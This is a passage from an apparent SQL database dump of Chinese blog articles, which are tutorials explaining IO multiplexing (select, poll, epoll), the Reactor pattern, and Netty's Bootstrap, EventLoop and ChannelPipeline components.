文件描述符放到一个 list 里。\n```java\nwhile(1) {\n  connfd = accept(listenfd);\n  fcntl(connfd, F_SETFL, O_NONBLOCK);\n  fdlist.add(connfd);\n}\n```\n然后，另一个线程不再自己遍历，而是调用 select，将这批文件描述符 list 交给操作系统去遍历。\n```java\nwhile(1) {\n  // 把一堆文件描述符 list 传给 select 函数\n  // 有已就绪的文件描述符就返回，nready 表示有多少个就绪的\n  nready = select(list);\n  ...\n}\n```\n不过，当 select 函数返回后，用户依然需要遍历刚刚提交给操作系统的 list。\n\n只不过，操作系统会将准备就绪的文件描述符做上标识，用户层将不会再有无意义的系统调用开销。\n```java\nwhile(1) {\n  nready = select(list);\n  // 用户层依然要遍历，只不过少了很多无效的系统调用\n  for(fd <-- fdlist) {\n    if(fd != -1) {\n      // 只读已就绪的文件描述符\n      read(fd, buf);\n      // 总共只有 nready 个已就绪描述符，不用过多遍历\n      if(--nready == 0) break;\n    }\n  }\n}\n```\n正如刚刚的动图中所描述的，其直观效果如下。\n\n![IO多路复用-select-img1.gif](http://blog.img.tuwq.cn/zhaungzai/img/IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8-select-img1.gif)\n\n可以看出几个细节：\n\n1. select 调用需要传入 fd 数组，需要拷贝一份到内核，高并发场景下这样的拷贝消耗的资源是惊人的。（可优化为不复制）\n2. select 在内核层仍然是通过遍历的方式检查文件描述符的就绪状态，是个同步过程，只不过无系统调用切换上下文的开销。（内核层可优化为异步事件通知）\n3. select 仅仅返回可读文件描述符的个数，具体哪个可读还是要用户自己遍历。（可优化为只返回给用户就绪的文件描述符，无需用户做无效的遍历）\n整个 select 的流程图如下。\n\n![IO多路复用-select-img3.png](http://blog.img.tuwq.cn/zhaungzai/img/IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8-select-img3.png)\n\n可以看到，这种方式，既做到了一个线程处理多个客户端连接（文件描述符），又减少了系统调用的开销（多个文件描述符只有一次 select 的系统调用 + n 次就绪状态的文件描述符的 read 系统调用）。\n\n### poll\npoll 也是操作系统提供的系统调用函数。\n```java\nint poll(struct pollfd *fds, nfds_tnfds, int timeout);\n\nstruct pollfd {\n  intfd; /*文件描述符*/\n  shortevents; /*监控的事件*/\n  shortrevents; /*监控事件中满足条件返回的事件*/\n};\n```\n它和 select 的主要区别就是，去掉了 select 只能监听 1024 个文件描述符的限制。\n\n### epoll\nepoll 是最终的大 boss，它解决了 select 和 poll 的一些问题。\n\n还记得上面说的 select 的三个细节么？\n\n1. select 调用需要传入 fd 数组，需要拷贝一份到内核，高并发场景下这样的拷贝消耗的资源是惊人的。（可优化为不复制）\n2. select 在内核层仍然是通过遍历的方式检查文件描述符的就绪状态，是个同步过程，只不过无系统调用切换上下文的开销。（内核层可优化为异步事件通知）\n3. select 仅仅返回可读文件描述符的个数，具体哪个可读还是要用户自己遍历。（可优化为只返回给用户就绪的文件描述符，无需用户做无效的遍历）\n\n所以 epoll 主要就是针对这三点进行了改进。\n\n1. 内核中保存一份文件描述符集合，无需用户每次都重新传入，只需告诉内核修改的部分即可。\n2. 内核不再通过轮询的方式找到就绪的文件描述符，而是通过异步 IO 事件唤醒。\n3. 内核仅会将有 IO 事件的文件描述符返回给用户，用户也无需遍历整个文件描述符集合。\n\n具体，操作系统提供了这三个函数。\n\n第一步，创建一个 epoll 句柄\n```java\nint epoll_create(int size);\n```\n第二步，向内核添加、修改或删除要监控的文件描述符。\n```java\nint epoll_ctl(\n  int epfd, int op, int fd, struct epoll_event *event);\n```\n第三步，类似发起了 select() 调用\n```java\nint epoll_wait(\n  int epfd, struct epoll_event *events, int max events, int timeout);\n```\n使用起来，其内部原理就像如下一般丝滑。\n\n![IO多路复用-epoll-img1.gif](http://blog.img.tuwq.cn/zhaungzai/img/IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8-epoll-img1.gif)\n\n如果你想继续深入了解 epoll 的底层原理，推荐阅读 https://mp.weixin.qq.com/s?__biz=MjM5Njg5NDgwNA==&mid=2247484905&idx=1&sn=a74ed5d7551c4fb80a8abe057405ea5e&chksm=a6e304d291948dc4fd7fe32498daaae715adb5f84ec761c31faf7a6310f4b595f95186647f12&scene=21#wechat_redirect， 从 linux 源码级别，一行一行非常硬核地解读 epoll 的实现原理，且配有大量方便理解的图片，非常适合源码控的小伙伴阅读。\n### 后记\n大白话总结一下。\n\n一切的开始，都起源于这个 read 函数是操作系统提供的，而且是阻塞的，我们叫它 阻塞 IO。\n\n为了破这个局，程序员在用户态通过多线程来防止主线程卡死。\n\n后来操作系统发现这个需求比较大，于是在操作系统层面提供了非阻塞的 read 函数，这样程序员就可以在一个线程内完成多个文件描述符的读取，这就是 *非阻塞 IO*。\n\n但多个文件描述符的读取就需要遍历，当高并发场景越来越多时，用户态遍历的文件描述符也越来越多，相当于在 while 循环里进行了越来越多的系统调用。\n\n后来操作系统又发现这个场景需求量较大，于是又在操作系统层面提供了这样的遍历文件描述符的机制，这就是 *IO 多路复用*。\n\n多路复用有三个函数，最开始是 select，然后又发明了 poll 解决了 select 文件描述符的限制，然后又发明了 epoll 解决 select 的三个不足。\n\n所以，IO 模型的演进，其实就是时代的变化，倒逼着操作系统将更多的功能加到自己的内核而已。\n\n如果你建立了这样的思维，很容易发现网上的一些错误。\n\n比如好多文章说，多路复用之所以效率高，是因为用一个线程就可以监控多个文件描述符。\n\n这显然是知其然而不知其所以然，多路复用产生的效果，完全可以由用户态去遍历文件描述符并调用其非阻塞的 read 函数实现。而多路复用快的原因在于，操作系统提供了这样的系统调用，使得原来的 while 循环里多次系统调用，变成了一次系统调用 + 内核层遍历这些文件描述符。\n\n就好比我们平时写业务代码，把原来 while 循环里调 http 接口进行批量，改成了让对方提供一个批量添加的 http 接口，然后我们一次 rpc 请求就完成了批量添加。一个道理。', 0, 0, 120, 0, 0, '2020-02-04 20:11:46', '2021-04-02 20:11:46', 0, 0);
INSERT INTO `article` VALUES (68, 1, 'Reactor模式概述', '2019/9/1567607173_mmexport1567588224177.jpg', '### 基本概念\n```java\n// Reactor模式是什么\n(1) Reactor模式也叫反应器模式，大多数IO相关组件如Netty、Redis在使用的IO模式\n(2) 较于传统BIO模式,极大的提高了可用性与性能\n```\n#### 传统BIO服务器设计\n![网络IOReactor模式普通BIO.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626696757_网络IO-Reactor模式-普通BIO.png)\n#### 代码示例\n```java\nclass Server implements Runnable {\n    public void run() {\n        try {\n            ServerSocket ss = new ServerSocket(PORT);\n            while (!Thread.interrupted())\n                new Thread(new Handler(ss.accept())).start();\n            // or, single-threaded, or a thread pool\n        } catch (IOException ex) { /* ... */ }\n    }\n    static class Handler implements Runnable {\n        final Socket socket;\n        Handler(Socket s) { socket = s; }\n        public void run() {\n            try {\n                byte[] input = new byte[MAX_INPUT];\n                socket.getInputStream().read(input);\n                byte[] output = process(input);\n                socket.getOutputStream().write(output);\n            } catch (IOException ex) { /* ... */ }\n        }\n        private byte[] process(byte[] cmd) { /* ... */}\n    }\n} \nNote: most exception handling elided from code examples\n```\n```java\n// 出现的问题\n(1) 线程太多了,每一个连接都会产生一个线程,如果连接数特别特别大的话,如果连接数达到了1w,那么服务端就要产生1w个线程,那这么成本就极高了\n(2) 经过一些基准测试发现在一台机器上,如果线程持续的上升,到达一个临界点之后,整个性能就急剧下降,因为线程与线程之间的切换是比较耗费资源的,同时,每一个系统,它承载的最大线程数实际上是有限制的\n(3) 这种方式适合处理量不大的一些网络业务\n\n// 需要达成可伸缩性的目标\n(1) 在负载增加下优雅降级(更多的客户端进行连接时)\n(2) 随着增加资源持续改进(CPU,内存,硬盘,带宽)\n(3) 满足可用性和性能目标\n	(1) 更短的延迟\n	(2) 满足高峰需求\n	(3) 可调节的服务质量\n(4) 分而治之(Divide-and-conque)通常是最好的,对于实现任何可伸缩性目标的方法\n```\n### Reactor模式\n![网络IOReactor模式角色.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626847922_网络IO-Reactor模式角色.png)\n```java\n// Reactor模式的角色构成(Reactor模式一共有5种角色构成)\n(1) Handler(句柄或是描述符): 本质上表示一种资源,是由操作系统提供的;该资源用于表示一个个的事件,比如说文件描述符,或是针对网络编程中的socket描述符.事件既可以来自外部,也可以来自于内部;外部事件比如说客户端的连接请求,客户端发送过来数据等;内部事件比如说操作系统产生的定时器事件等.它本质上就是一个文件描述符.Handler是事件产生的发源地\n(2) Synchronous Event Demultiplexer(同步事件分离器): 它本身是一个系统调用,用于等待事件的发生(事件可能是一个,也可能是多个).调用方在调用它的时候会被阻塞,一直阻塞到同步时间分离器上有事件产生为止.对于linux来说,同步事件分离器指的就是常用的I/O多路复用,比如说select,poll,epoll等.在Java NIO领域中,同步事件分离器对应的组件就是Selector;对应的阻塞方法就是select方法\n(3) Initiation Dispatcher(初始分发器):实际上就是Reactor角色,它本身定义了一些规范,这些规范用于控制事件的调度方式,同时又提供了应用进行事件处理器的注册,删除等设施,它本身是整个事件处理器的核心所在,InitiationDispatcher会通过同步事件分离器来等待事件的发生。一旦事件发生,Initiation Dispatcher首先会先分离出每一个事件,然后调用事件处理器,最后调用相关的回调方法来处理这些事件\n(4) EventHandler(事件处理器): 本身由多个回调方法构成,这些回调方法构成了与应用相关的对于某个事件的反馈机制,Netty相比于Java NIO来说,在事件处理器这个角色上进行了一个升级,它为我们开发者提供了大量的回调方法,供我们在特定事件产生时实现相应的回调方法进行业务逻辑的处理。\n(5) Concrete Event Handler(具体事件处理器):是事件处理器的实现,它本身实现了事件处理器所提供的各个回调方法,从而实现了特定于业务的逻辑.它本质上就是netty中我们所编写的一个个的处理器实现.\n\n// Reactor模式的流程\n(1) 当应用向InitiationDispatcher注册具体的事件处理器时,应用会标识出该事件处理器希望InitiationDispatcher在某个事件发生时向其通知的该事件,该事件与Handle关联\n(2) InitiationDispatcher会要求每个事件处理器向其传递内部的Handler,该Handler向操作系统标识了事件处理器.\n(3) 当所有的事件处理器注册完毕后,应用会调用InitiationDispatcher的handle_event方法来启动InitiationDispatcher的事件循环,这时,InitiationDispatcher会将每个注册的事件管理器的Handle合并起来,并使用同步事件分离器等待这些事件的发生.比如说,TCP协议层会使用select同步事件分离器操作来等待客户端发送的数据到达连接的socketHandler上\n(4) 当与某个事件源对应的Handle变为ready状态时(比如说,TCP socket变为等待读状态时),同步事件分离器就会知道 InitiationDispatcher\n(5) InitiationDispatcher会触发事件处理器的回调方法,从而响应这个处于ready状态的Handle。当事件发生时,InitiationDispatcher会将被事件源激活的Handler作为 Key 来寻找并分发恰当的事件处理器回调方法\n(6) InitiationDispatcher会回调事件处理器的handle_event回调方法来执行特定于应用的功能(开发者自己所编写的功能),从而响应这个事件,所发生的事件类型可以作为该方法参数并被该方法内部使用来执行额外的特定于服务的分离与分发。\n\n// 换一种说法\n(1) 在初始化InitiationDispatcher之后,将若干个ConcreteEventHandler注册到其上,\n(2) 由于ConcreteEventHandler会拥有handler,再注册的同时就会指定某一个事件处理器它感兴趣的事件到底是什么(SectionKey),\n(3) 当注册handler完成后,InitiationDispatcher就会事件循环启动\n(4) 启动完事件循环之后,同步事件分离器的select()等待着事件的产生\n(5) 当有事件产生的时候(若干个),同步事件分离器会获取所产生的那些事件,并给InitiationDispatcher这些事件\n(6) InitiationDispatcher根据这些事件,寻找到与这个事件有关联的那一系列handler,遍历handler,根据感兴趣事件的类型再去调用Concrete Event Handler当中的handle_event方法,至此事件循环结束了。\n```\n### 多线程的Reactor模式\n![网络IOReactor模式多线程.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626847922_网络IO-Reactor模式-多线程.png)\n```java\n// Reactor模式中担任的角色\nMainReactor,Acceptor,SubReactor: 担任了相当于Initiation Dispatcher,也就是Reactor角色。\nInitiationDispatcher会通过SynchronousEventDemultiplexer同步事件分离器(在JavaNIO中就是selector.select())来等待事件的发生。\n一旦事件发生,Initiation Dispatcher首先会先分离出每一个事件,然后调用事件处理器,最后调用相关的回调方法来处理这些事件\n\n// 为什么使用两个Reactor角色,acceptor是什么\n(1) mainReactor（bossGroup/parentGroup）用于事件轮询接收请求,不做其他事情处理\n(2) subReactor（workGroup/childrenGroup）得到事件后分发事务处理\n(3) acceptor是mainReactor与subReactor之间交互的桥梁和纽带\n\n// Worker Threads\n(1) 移交非IO处理以加快反应器线程速度,与POSA2 Proactor设计类似\n(2) 比重新计算绑定更简单,处理成事件驱动的形式,应该仍然是纯粹的非阻塞计算,足够的处理来超过开销\n(3) 但更难以与IO重叠处理,最好可以先将所有输入读入缓冲区\n(4) 使用线程池，因此可以调整和控制,通常需要比客户端少得多的线程\n(5) 多个反应器线程,反应器线程可以使IO完全饱和,将负载分配给其他反应器,负载平衡以匹配CPU和IO速率\n(6) netty大致部分基于此Reactor多线程模式进行编写,所以说Netty整体架构是Reactor模式的完整体现。\n(7) netty大致参考了该多线程Reactor模式,但具体实现上不一样。\n\n```\n```java\n// 参考文献\nhttp://www.dre.vanderbilt.edu/~schmidt/PDF/reactor-siemens.pdf\nhttp://gee.cs.oswego.edu/dl/cpjslides/nio.pdf\n```', 0, 0, 118, 0, 0, '2020-02-07 22:26:24', '2020-03-25 22:26:24', 0, 0);
INSERT INTO `article` VALUES (69, 1, 'Netty的Bootstrap与EventLoop', '2019/9/1568276290_mmexport1568273999714.jpg', '### Bootstrap\n![NettyBootstrap.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626846547_Netty-Bootstrap.png)\n```java\n// Bootstrap与ServerBootstrap\n(1) netty程序最开始的时候会 new 一个 Bootstrap 对象，后面所有的配置都是基于这个对象展开的。\n(2) Bootstrap 的作用就是将 Netty 核心组件配置到程序中，并且让他们运行起来\n(3) 从 Bootstrap 的继承结构来看，分为两类分别是 Bootstrap 和 ServerBootstrap，一个对应客户端的引导，另一个对应服务端的引导。\n(4) 客户端引导 Bootstrap，主要有两个方法 bind（） 和 connect（）。\n(5) Bootstrap 通过 bind（） 方法创建一个 Channel。\n(6) 在 bind（） 之后，通过调用 connect（） 方法来创建 Channel 连接。\n(7) 服务端引导 ServerBootstrap，与客户端不同的是在 Bind（） 方法之后会创建一个 ServerChannel，它不仅会创建新的 Channel 还会管理已经存在的 Channel。\n\n// Bootstrap客户端引导:\n(1) 只要知道服务端 IP 和 Port 建立连接就可以了。\n(2) 只需要一个 EventLoopGroup。\n\n// ServerBootstrap服务端引导:\n(1) 绑定一个端口，用来监听客户端的连接请求。\n(2) 需要两个 EventLoopGroup。\n(3) 因为服务段需要两组不同的 Channel。第一组 ServerChannel 自身监听本地端口的套接字。第二组用来监听客户端请求的套接字。\n\n// Channel\n(1) Channel是代表连接，实体之间的连接，程序之间的连接，文件之间的连接，设备之间的连接。同时它也是数据入站和出站的载体。\n(2) 一个Channel可以被注册到多个selector上,但在每个selector中这个Channel是唯一的,不会重复。\n(3) 一个selector可以注册多个Channel,轮询多个Channel得到网络事件。\n\n// 子Channel\nServerSocketChannel只关注连接事件.不关注其他事件。\n通过serverSocketChannel.accpet()获得SocketChannel被称为ServerSocketChannel的子Channel\n在子Channel上注册关注的数据读取事件\n\n```\n### EventLoop与EventLoopGroup\n![NettyEventLoop与EventLoopGroup.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626846547_Netty-EventLoop与EventLoopGroup.png)\n```java\n// BossEventLoopGroup与WorkerEventLoopGroup\n(1) Netty服务器编程中需要BossEventLoopGroup和WorkerEventLoopGroup两个EventLoopGroup来进行工作。\n(2) BossEventLoopGroup负责接收客户端的连接并将SocketChannel交给WorkerEventLoopGroup来进行IO处理。\n(3) BossEventLoopGroup主要处理客户端的connect事件,包含多个EventLoop,每个EventLoop对应一个线程\n(4) WorkerEventLoopGroup主要处理客户端Socket的数据read、write事件、包含多个EventLoop,每个EventLoop对应一个线程\n(5) 无论是Boss还是Worker,事件的处理都是通过ChannelPipeline组织的,它是责任链模式的实现,包含一个或多个ChannelHandler。\n(6) 监听一个端口,只会绑定到BossEventLoopGroup中的一个EventLoop\n(7) WorkerEventLoopGroup中的每一个EventLoop可以监听多个客户端的Socket\n\n// BossNioEventLoop\n每个BossNioEventLoop循环执行的任务包含3步:\n(1) 轮询accept事件\n(2) 处理accept I/O事件,与Client建立连接,生成NioSocketChannel,并将NioSocketChannel注册到某个WorkerNioEventLoop的Selector上\n(3) 处理任务队列中的任务,runAllTasks。\n任务队列中的任务包含用户调用eventloop.execute()\n或schedule执行任务或者其他线程提交到该eventloop的任务。\n\n// WorkerNioEventLoop\n每个WorkerNioEventLoop循环执行的任务包含3步\n(1) 轮询read、write事件\n(2) 处理I/O事件,即read、write事件,在NioSocketChannel可读、可写事件发生时进行处理。\n(3) 处理任务队列中的任务,runAllTasks。\n\n// Acceptor\n(1) Acceptor负责BossEventLoopGroup与WorkerEventLoopGroup交互。\n(2) BossEventLoopGroup+workGroup+Acceptor实际上就是充当Reactor模式中InitiationDispatcher(初始分发器)角色。\n\n// EventLoopGroup\n() 一个 EventLoopGroup 中包含了多个 EventLoop 对象。\n(2) 负责管理内部的多个EventLoop。\n\n// EventLoop\n(1) 每个 EventLoop 会占用一个 Thread，同时这个 Thread 会处理 EventLoop 上面发生的所有 IO 操作和事件\n(2) 在 Netty 中每个 Channel 都会被分配到一个 EventLoop。一个 EventLoop 可以服务于多个 Channel。\n(3) 一个 EventLoop 是可以处理多个 Channel 中产生的事件的，EventLoop它主要的工作就是事件的发现以及通知。\n(4) 底层是一个死循环,内部不停地去侦测底层输入输出的事件,对事件进行处理,处理完之后进行任务的执行。\n(5) 通过JavaNIO的selector中的select()方法来等待事件的发生,一旦事件发生,它首先会先分离出每一个事件,然后进行通知处理。\n```', 0, 0, 111, 0, 0, '2020-02-09 16:18:20', '2020-02-09 16:18:20', 0, 0);
INSERT INTO `article` VALUES (70, 1, 'Netty的ChannelPipeline与ChannelHandler', '2019/9/1568457371_mmexport1568274112355.jpg', '### 基本概念\n![NettyChannelPipline与ChannelHandle的关系.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626784244_Netty-ChannelPipline与ChannelHandle的关系.png)\n```java\n// ChannelHandler\n(1) ChannelHandler 是事件的处理者。\n(2) ChannelHandler 中可以添加一些业务代码，例如数据转换，逻辑运算等等。\n针对出站和入站的事件，有不同的 ChannelHandler，分别是：\nChannelInBoundHandler（入站事件处理器）\nChannelOutBoundHandler（出站事件处理器）\n\n// ChannelPipeline是什么\n(1) 每次请求都会触发事件，而由 ChannelHandler 来处理这些事件,这个事件的处理顺序是由 ChannelPipeline 来决定的。\n(2) ChannelPipeline 为 ChannelHandler 链提供了容器。\n(3) 当 Channel 被创建的时候，会被 Netty 框架自动分配到 ChannelPipeline 上。\n(4) ChannelPipeline 保证 ChannelHandler 按照一定顺序处理事件，当事件触发以后，会将数据通过 ChannelPipeline 按照一定的顺序通过 ChannelHandler。\n(5) ChannelPipeline 是负责“排队”的。这里的“排队”是处理事件的顺序。\n(6) 同时，ChannelPipeline 也可以添加或者删除 ChannelHandler，管理整个队列。\n(7) ChannelPipeline 使 ChannelHandler 按照先后顺序排列，信息按照箭头所示方向流动并且被 ChannelHandler 处理。\n\n// ChannelHandlerContext\n(1) ChannelPipeline 和 ChannelHandler，前者管理后者的排列顺序。\n(2) 它们之间的关联就由 ChannelHandlerContext 来表示了。\n(3) 每当有 ChannelHandler 添加到 ChannelPipeline 时，同时会创建 ChannelHandlerContext 。\n(4) ChannelHandlerContext 的主要功能是管理 ChannelHandler 和 ChannelPipeline 的交互。\n(5) ChannelHandlerContext 参数贯穿 ChannelPipeline，将信息传递给每个 ChannelHandler。\n\n// 三者关系\n(1) 每一个Channel都会注册到特定的一个EventLoop上面\n(2) 每一个Channel都会有一个ChannelPipeline与之对应,它们互持有引用,并且这种关联关系在整个Channel生命周期当中是不会发生改变的,channel一旦绑定到了某个channelPipeline上面,它就不可能再去绑定到其他的channelPipeline上面,它们之间是一对一的映射关系\n(3) ChannelPipeline当中存放的是若干个ChannelHandlerContext对象,而ChannelHandleContext里面是可以引用到对应的ChannelHande这个处理器对象的,这样就建立好了组件的关联关系\n(4) ChannelHandlerContext对象里面存放了我们所编写的或者netty内置所提供的ChannelHandle对象\n(5) 因此ChannelPipeline当中实际真正存放的对象并不是ChannelHandle而是ChannelHandleContext\n(6) 对于channelPipeline来说,它里面维护一个又一个的channelHandle,实际是由一个双向链表来构造的,来创建每一个channelHandle的同时,又会为它创建对应的channelHandlerContext对象,channelHandleContext对象是连接channelPipeline与channelHandle的桥梁和纽带\n(7) ChannelHandle本身分为两个方向的,一个Inbound入栈,一个Outbound出栈,只处理符合本身职责的事件\n(8) ChannelPipeline实现了高级拦截过滤器的管理\n\n```\n### ChannelPipeline\n#### 初始化ChannelPipeline\n![newChannelPipeline.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568462705_newChannelPipeline.png)\n![newChannelPipeline2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568462705_newChannelPipeline2.png)\n```java\n(1) ChannelPipeline是当每个Channel新建的时候创建,是在AbstractChannel构造方法中创建\n(2) DefaultChannelPipeline内部封装了一个channel对象,channel也可以访问到channelPipeline,它们互持有引用\n(3) 通过链表的方式将TailContext和HeadContext链接起来,这证明ChannelPipeline对ChannelHandlerContext的操作本质上是链表的操作\n```\n#### ChannelPipeline的出入站\n```java\n *  +---------------------------------------------------+---------------+\n *  |                           ChannelPipeline         |               |\n *  |                                                  \\|/              |\n *  |    +---------------------+            +-----------+----------+    |\n *  |    | Inbound Handler  N  |            | Outbound Handler  1  |    |\n *  |    +----------+----------+            +-----------+----------+    |\n *  |              /|\\                                  |               |\n *  |               |                                  \\|/              |\n *  |    +----------+----------+            +-----------+----------+    |\n *  |    | Inbound Handler N-1 |            | Outbound Handler  2  |    |\n *  |    +----------+----------+            +-----------+----------+    |\n *  |              /|\\                                  .               |\n *  |               .                                   .               |\n *  | ChannelHandlerContext.fireIN_EVT() ChannelHandlerContext.OUT_EVT()|\n *  |        [ method call]                       [method call]         |\n *  |               .                                   .               |\n *  |               .                                  \\|/              |\n *  |    +----------+----------+            +-----------+----------+    |\n *  |    | Inbound Handler  2  |            | Outbound Handler M-1 |    |\n *  |    +----------+----------+            +-----------+----------+    |\n *  |              /|\\                                  |               |\n *  |               |                                  \\|/              |\n *  |    +----------+----------+            +-----------+----------+    |\n *  |    | Inbound Handler  1  |            | Outbound Handler  M  |    |\n *  |    +----------+----------+            +-----------+----------+    |\n *  |              /|\\                                  |               |\n *  +---------------+-----------------------------------+---------------+\n *                  |                                  \\|/\n *  +---------------+-----------------------------------+---------------+\n *  |               |                                   |               |\n *  |       [ Socket.read() ]                    [ Socket.write() ]     |\n *  |                                                                   |\n *  |  Netty Internal I/O Threads (Transport Implementation)            |\n *  +-------------------------------------------------------------------+\n```\n\n```java\n// 入站事件\n(1) 入站事件由入站处理程序在自下而上的方向处理，如左侧所示图\n(2) 入站处理程序通常处理由底部的I/O线程生成的栈站数据图\n(3) 通常通过实际输入操作从远程对等端读取入栈数据,如{@link SocketChannel #read（ByteBuffer）}\n(4) 如果入站事件超出顶部入站处理程序，则会将其丢弃\n\n// 出站事件\n(1) 出站事件由自上而下方向的出站处理程序处理，如右侧所示图\n(2) 出站处理程序通常会生成或转换出站流量，例如写入请求\n(3) 如果出站事件超出底部出站处理程序，则由与之关联的I/O线程处理\n(4) I/O线程经常执行实际的输出操作，例如{@link SocketChannel #write（ByteBuffer）}。\n\n// 举出例子\n// 例如，我们假设我们创建了以下管道\n ChannelPipeline pipeline = ch.pipeline();\n p.addLast（“1”，new InboundHandlerA（））;\n p.addLast（“2”，new InboundHandlerB（））;\n p.addLast（“3”，new OutboundHandlerA（））;\n p.addLast（“4”，new OutboundHandlerB（））;\n p.addLast（“5”，new InboundOutboundHandlerX（））;\n\n// 在上面的示例中\n// 名称以{@code Inbound}开头的类表示它是入栈处理程序\n// 名称以{@code Outbound}开头的类表示它是出栈处理程序\n\n// 在给定的示例配置中\n// 当事件入栈时，处理程序评估顺序为1,2,3,4,5\n// 当活动出栈时，处理程序评估顺序为5,4,3,2,1\n\n// 3和4不实现{@link ChannelInboundHandler}，因此实际的站栈评估顺序将是1,2,5\n// 1和2不实现{@link ChannelOutboundHandler}，因此实际的站栈评估顺序将是5,4,3\n\n// 如果5实现{@link ChannelInboundHandler}和{@link ChannelOutboundHandler}\n// 入站和出站事件分别为125和543\n```\n#### 事件传播\n```java\n// 处理程序必须调用{@link ChannelHandlerContext}的事件传播方法\n// 事件传播的方法在ChannelHandler中有详细说明\n// 以下示例显示了事件传播通常如何完成\npublic class MyInboundHandler extends {@link ChannelInboundHandlerAdapter} {\n    public void channelActive({@link ChannelHandlerContext} ctx) {\n        System.out.println(\"Connected!\");\n        ctx.fireChannelActive();\n    }\n}\n\npublic class MyOutboundHandler extends {@link ChannelOutboundHandlerAdapter} {\n    public void close({@link ChannelHandlerContext} ctx, {@link ChannelPromise} promise) {\n        System.out.println(\"Closing ..\");\n        ctx.close(promise);\n    }\n}\n```\n#### 创建管道\n```java\n// 用户应该在管道中有一个或多个ChannelHandler来接收I/O事件例如读取和请求I/O操作（例如写入和关闭).例如，典型的服务器将具有以下处理程序\n// 在每个频道的管道中，但您的里程可能会根据其复杂性和特点而有所不同\n// 协议和业务逻辑\n// 协议解码器 - 将二进制数据（例如{@link ByteBuf}）转换为Java对象\n// 协议编码器 - 将Java对象转换为二进制数据。\n// 业务逻辑处理程序 - 执行实际业务逻辑（例如数据库访问）。\n\n// 它可以表示如下例所示\n\nstatic final EventExecutorGroup group = new DefaultEventExecutorGroup(16);\nChannelPipeline pipeline = ch.pipeline();\n\npipeline.addLast(\"decoder\", new MyProtocolDecoder());\npipeline.addLast(\"encoder\", new MyProtocolEncoder());\n\n// 告诉ChannelHandlerPipeline运行MyBusinessLogicHandler的事件处理程序方法\n// 在与I/O线程不同的线程中，以便I/O线程不被阻塞\n// 用于耗时任务\n// 如果您的业务逻辑完全异步或很快完成,则不需要指定一个线程组\npipeline.addLast(group, \"handler\", new MyBusinessLogicHandler());\n```\n#### 线程安全\n```java\n(1) 可以随时添加或删除ChannelHandler，因为ChannelPipeline是线程安全的\n(2) 例如，您可以在即将交换敏感信息时插入加密处理程序,交换后并将其删除\n```\n#### 两种发送消息方式的不同\n![Netty两种发送消息writeAndFlush的不同.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626784244_Netty-两种发送消息writeAndFlush的不同.png)\n```java\n	@Override\n    protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n        System.out.println(ctx.channel().remoteAddress() + \",\" + msg);\n        ctx.channel().writeAndFlush(\"from server: \" + UUID.randomUUID());\n        ctx.writeAndFlush(\"from server: \" + UUID.randomUUID());\n    }\n\n(1) 在netty中有两种发送消息的方式,可以直接写到channel中,也可以写到与channelHandler所关联的那个ChannelHandleContext中\n(2) 对于ctx.channel().writeAndFlush()来说,消息会从ChannelPipeline的末尾开始流动\n(3) 对于ctx.writeAndFlush()来说,消息将从ChannelPipeline中的下一个channelHandle开始流动\n(4) 因此Channel与ChannelHandlerContext里面拥有很多同名同语义的方法,它们的作用域实际上是不一样的\n\n// 使用建议\n(1) ChannelHandlerContext与ChannelHandler之间的关联绑定关系是永远都不会发送改变的,因此对其进行缓存是没有任何问题的\n(2) 对于与Channel的同名方法来说,ChannelHandlerContext的方法将产生更短的事件流,所以我们应该在可能的情况下利用这个特性来提升应用性能\n(3) 在channelRead0方法中,我们应该使用自己定义的业务线程池,防止对Netty的EventLoop的IO线程进行阻塞\n```\n### ChannelHandler\n```java\n// ChannelHandler是什么\n(1) 用于处理处理I/O事件或拦截I/O操作的处理器\n(2) 充当于Reactor模式中的Concrete Event Handler(具体事件处理器)\n(3) ChannelHandler本身并没有提供很多方法，但你通常必须实现它的一个子类型 \n\n// 子类型\n(1) ChannelInboundHandler来处理入栈I/O事件,比如处理来自客户端请求\n(2) ChannelOutboundHandler来处理出栈I/O操作,比如处理对客户端的响应\n或者，为方便起见，提供以下适配器类\n(1) ChannelInboundHandlerAdapter来处理入栈I/O事件\n(2) ChannelOutboundHandlerAdapter来处理出栈I/O操作\n(3) ChannelDuplexHandle*来处理入栈和出栈事件\n\n```\n#### 初始化ChannelHandler\n![newChannelHandler.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568464298_newChannelHandler.png)\n```java\n(1) 在ChannelInitializer的实现类中initChannel方法中向ChannelPipeline中进行添加ChannelHandler\n(2) 这些ChannelHandler中包含Netty所提供的ChannelHandler和我们所实现的ChannelHandler\n(3) initChannel(C ch): 注册channel后将调用此方法\n(4) 当这个方法返回后,将从Channel的ChannelPipeline中删除调用此方法的实例\n(5) 每当有一个客户端连接新建Channel时就会调用一次initChannel(C ch)\n\n```\n#### ChannelInitializer的作用\n![removeChannelInitializer.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568464298_removeChannelInitializer.png)\n```java\n// ChannelInitializer的作用\n(1) 一个特殊的ChannelInboundHandler，它提供了一种在 EventLoop注册后初始化Channel的简便方法\n(2) ChannelInitializer本身并不是ChildHandle的编写逻辑实现,而是起到一个封装的作用\n(3) ChannelInitializer作用是用于通过initChannel这个方法一次性添加多个处理器\n\n// Sharable注解作用\n(1) 该注解标识ChannelHandler相同的实例可以多次添加到一个或多个ChannelPipeline\n(2) 如果未指定此注解,每次将它添加到管道实例时,你必须创建新的ChannelHandler实例\n\n```\n### ChannelHandlerContext\n```java\n// ChannelHandlerContext是什么\n(1) ChannelHandler与channelPipeline之间交互的桥梁和纽带\n(2) 一个ChannelHandler可以通知ChannelPipeline当中的下一个channelHandler,并且还可以动态的修改ChannelHandler所属的ChannelPipeline\n(3) 